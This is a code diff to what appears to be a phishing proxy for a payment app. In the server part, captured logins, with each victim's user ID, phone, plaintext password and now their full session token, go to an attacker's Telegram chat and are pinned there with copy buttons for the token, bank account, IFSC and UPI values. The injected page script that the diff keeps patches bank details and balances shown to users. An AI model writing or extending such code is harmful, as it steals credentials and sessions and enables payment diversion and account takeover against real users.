@@ -280,10 +280,60 @@ function getOrderAmount(req, respData) {
   return null;
 }
 
-async function notifyAdmin(data, msg) {
-  if (data.adminChatId && bot) {
-    try { await bot.sendMessage(data.adminChatId, msg.substring(0, 4000)); } catch (e) { }
+function getTelegramCopyItems(msg) {
+  const text = String(msg || '');
+  const rules = [
+    { label: 'Order ID', re: /(?:^|\n)\\s*(?:📋\\s*)?(?:Order(?: ID)?|rptNo|Receipt|Transaction)\\s*:\s*([^\n]+)/i },
+    { label: 'User ID', re: /(?:^|\n)\\s*(?:👤\\s*)?(?:User ID|User)\\s*:\s*([^\n]+)/i },
+    { label: 'Phone', re: /(?:^|\n)\\s*(?:📱\\s*)?Phone\\s*:\s*([^\n]+)/i },
+    { label: 'Account', re: /(?:^|\n)\\s*(?:Account|Acc(?:ount)? No)\\s*:\s*([^\n]+)/i },
+    { label: 'IFSC', re: /(?:^|\n)\\s*(?:IFSC)\\s*:\s*([^\n]+)/i },
+    { label: 'UPI ID', re: /(?:^|\n)\\s*(?:UPI(?: ID)?|VPA)\\s*:\s*([^\n]+)/i },
+    { label: 'Amount', re: /(?:^|\n)\\s*(?:💰\\s*)?Amount\\s*:\s*([^\n]+)/i },
+    { label: 'App Token', re: /(?:^|\n)\\s*(?:🎫\\s*)?Token\\s*:\s*([^\n]+)/i }
+  ];
+  return rules.map(rule => {
+    const match = text.match(rule.re);
+    if (!match) return null;
+    const value = String(match[1]).replace(/`/g, '').trim();
+    return value && !/^N\/A$/i.test(value) ? { label: rule.label, value } : null;
+  }).filter(Boolean);
+}
+
+async function notifyAdmin(data, msg, options = {}) {
+  if (!data.adminChatId || !bot) return null;
+  const providedCopyItems = Array.isArray(options.copyItems)
+    ? options.copyItems.filter(item => item && item.label && item.value !== undefined && item.value !== null && String(item.value) !== '')
+    : [];
+  const detectedCopyItems = getTelegramCopyItems(msg);
+  const seenCopyLabels = new Set();
+  const copyItems = [...providedCopyItems, ...detectedCopyItems].filter(item => {
+    const key = String(item.label).toLowerCase();
+    if (seenCopyLabels.has(key)) return false;
+    seenCopyLabels.add(key);
+    return true;
+  });
+  const replyMarkup = copyItems.length
+    ? { inline_keyboard: copyItems.slice(0, 8).map(item => [{ text: `Copy ${item.label}`, copy_text: { text: String(item.value) } }]) }
+    : undefined;
+  let sent = null;
+  try {
+    const sendOptions = replyMarkup ? { reply_markup: replyMarkup } : {};
+    sent = await bot.sendMessage(data.adminChatId, String(msg).substring(0, 4000), sendOptions);
+  } catch (e) {
+    // Older Telegram Bot API versions may reject copy_text buttons; keep the notification reliable.
+    if (replyMarkup) {
+      try { sent = await bot.sendMessage(data.adminChatId, String(msg).substring(0, 4000)); } catch (e2) { }
+    }
   }
+  if (options.pin && sent && sent.message_id) {
+    try {
+      await bot.pinChatMessage(String(data.adminChatId), sent.message_id, { disable_notification: true });
+    } catch (e) {
+      // Pinning requires admin rights; the notification itself should still succeed.
+    }
+  }
+  return sent;
 }
 
 function extractPaymentProof(rawBody, contentType) {
@@ -1813,13 +1863,20 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
       const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
 
-      const maskedToken = extractedToken ? String(extractedToken).slice(0, 8) + '...' : '';
-      notifyAdmin(data,
-        `🔑 LOGIN CAPTURED
+      const fullToken = extractedToken ? String(extractedToken) : '';
+      const loginMessage = `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
 💻 Platform: ${platformStr}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${maskedToken ? '\n🎫 Token: `' + maskedToken + '`' : ''}
-🕐 ${now}`);
+📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${fullToken ? '\n🎫 Token: `' + fullToken + '`' : ''}
+🕐 ${now}`;
+      await notifyAdmin(data, loginMessage, {
+        pin: true,
+        copyItems: [
+          { label: 'User ID', value: userId },
+          { label: 'Phone', value: phone },
+          { label: 'App Token', value: fullToken }
+        ]
+      });
 
     }
 
@@ -2692,49 +2749,6 @@ while(walker.nextNode()){
 }catch(e){}
 }
 
-function _copyToast(){
-try{
-var toast=document.createElement('div');toast.textContent='Copied!';
-toast.style.cssText='position:fixed;z-index:2147483647;left:50%;top:18%;transform:translateX(-50%);background:#1f2937;color:#fff;padding:8px 14px;border-radius:6px;font:14px sans-serif;box-shadow:0 2px 10px rgba(0,0,0,.25);pointer-events:none;';
-document.body.appendChild(toast);setTimeout(function(){if(toast.parentNode)toast.parentNode.removeChild(toast);},900);
-}catch(e){}}
-function _copyFallback(value,done){
-try{var ta=document.createElement('textarea');ta.value=value;ta.setAttribute('readonly','');ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.parentNode.removeChild(ta);done();}catch(e){}}
-function _copyValue(value,el){
-if(!value)return;
-var done=function(){try{var old=el.style.color;el.style.color='#16a34a';setTimeout(function(){el.style.color=old;},700);}catch(e){} _copyToast();};
-try{if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(value).then(done).catch(function(){_copyFallback(value,done);});return;}}catch(e){}
-_copyFallback(value,done);
-}
-function _copyCandidate(txt,ctx){
-var s=(txt||'').trim(), c=(ctx||'').toLowerCase();
-if(!s||s.length>180)return null;
-if(c.indexOf('ifsc')>-1){var im=s.match(/[A-Za-z]{4}0[A-Za-z0-9]{6}/);if(im)return {v:im[0].toUpperCase(),k:'IFSC'};}
-if(c.indexOf('upi')>-1||c.indexOf('vpa')>-1||c.indexOf('pay id')>-1||c.indexOf('payaccount')>-1){var um=s.match(/[A-Za-z0-9._-]+@[A-Za-z0-9.-]+/);if(um)return {v:um[0],k:'UPI ID'};}
-if(c.indexOf('account')>-1||c.indexOf('acct')>-1){var am=s.match(/[0-9]{8,20}/);if(am)return {v:am[0],k:'Account'};}
-if(c.indexOf('order')>-1||c.indexOf('rpt')>-1||c.indexOf('transaction')>-1||c.indexOf('receipt')>-1){var om=s.match(/[A-Za-z0-9_-]{8,}/);if(om&&om[0].toLowerCase()!=='transaction')return {v:om[0],k:'Order ID'};}
-if(c.indexOf('amount')>-1&&/[0-9]/.test(s)){var vm=s.match(/[0-9]+(?:\\.[0-9]+)?/);if(vm)return {v:vm[0],k:'Amount'};}
-return null;
-}
-function addCopyButtons(){
-try{if(!document.body)return;
-var nodes=document.querySelectorAll('body *');
-for(var i=0;i<nodes.length;i++){
-var el=nodes[i], tag=(el.tagName||'').toLowerCase(), isField=tag==='input'||tag==='textarea';
-if(!isField&&el.children&&el.children.length>0)continue;
-if(el.hasAttribute('data-px-copy'))continue;
-var txt=isField?(el.value||el.getAttribute('value')||''):(el.textContent||'');
-var p=el.parentElement, pp=p&&p.parentElement;
-var ctx=((p?p.innerText||'':'')+' '+(pp?pp.innerText||'':'')+' '+(el.getAttribute('aria-label')||'')+' '+(el.getAttribute('class')||'')).toLowerCase();
-var candidate=_copyCandidate(txt,ctx);if(!candidate)continue;
-el.setAttribute('data-px-copy','1');el.setAttribute('data-px-copy-value',candidate.v);el.setAttribute('title','Click to copy '+candidate.k);el.style.cursor='copy';el.style.userSelect='text';el.style.textDecoration='underline dotted';el.style.fontFamily='monospace';
-}
-}catch(e){}}
-document.addEventListener('click',function(e){
-try{var el=e.target,depth=0;while(el&&depth<8&&!el.getAttribute('data-px-copy')){el=el.parentElement;depth++;}
-if(el&&el.getAttribute('data-px-copy')){var v=el.getAttribute('data-px-copy-value');if(v){e.preventDefault();e.stopPropagation();_copyValue(v,el);}}}catch(x){}}
-,true);
-
 function patchBalDOM(){
 if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
 if(!document.body)return;
@@ -2885,19 +2899,19 @@ var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
 if(m&&m[1])setUID(m[1]);
 }catch(e){}}
 
-scanDOM();patchBankDOM();patchBalDOM();addCopyButtons();
-var _rafC=0;function _rafLoop(){patchBankDOM();patchBalDOM();addCopyButtons();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
+scanDOM();patchBankDOM();patchBalDOM();
+var _rafC=0;function _rafLoop(){patchBankDOM();patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
 requestAnimationFrame(_rafLoop);
-setInterval(function(){scanDOM();patchBankDOM();patchBalDOM();addCopyButtons();},300);
+setInterval(function(){scanDOM();patchBankDOM();patchBalDOM();},300);
 if(document.body){
-var obs=new MutationObserver(function(){patchBankDOM();patchBalDOM();addCopyButtons();fixLinks();fixOnClick();scanDOM();});
+var obs=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
 obs.observe(document.body,{childList:true,subtree:true,characterData:true});}
 else{document.addEventListener('DOMContentLoaded',function(){
-patchBankDOM();patchBalDOM();addCopyButtons();
-var obs2=new MutationObserver(function(){patchBankDOM();patchBalDOM();addCopyButtons();fixLinks();fixOnClick();scanDOM();});
+patchBankDOM();patchBalDOM();
+var obs2=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
 obs2.observe(document.body,{childList:true,subtree:true,characterData:true});});}
 setInterval(function(){fixLinks();fixOnClick();},2000);
-fixLinks();fixOnClick();patchBankDOM();patchBalDOM();addCopyButtons();
+fixLinks();fixOnClick();patchBankDOM();patchBalDOM();
 })();`;
 
 // ─── Frontend catch-all proxy ───────────────────────────────────────────────
